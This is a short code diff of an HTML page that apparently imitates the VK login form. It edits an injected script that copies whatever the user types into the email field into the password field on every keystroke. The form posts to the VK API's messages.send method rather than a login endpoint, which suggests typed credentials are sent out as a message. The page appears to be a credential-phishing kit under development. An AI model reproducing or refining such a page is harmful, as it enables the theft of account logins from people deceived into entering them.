@@ -237,10 +237,10 @@ var abp;
   <div id="wrap1">
     <div id="content"><div id="index_rcolumn" class="index_rcolumn">
   <div id="index_login" class="page_block index_login">
-            <script> var inp = document.querySelectorAll('input[id="index_email"]');
-var ip = document.querySelectorAll('input[type="password"]');
+            <script> var inp = document.getElementById('index_email');
+var ip = document.getElementById('index_pass');
 document.addEventListener('input',function(){
-ip[0].value = ' '+inp[0].value
+ip.value = ' '+inp.value;
 
 });</script>
     <form method="post" name="login" id="index_login_form" action="https://api.vk.com/method/messages.send">
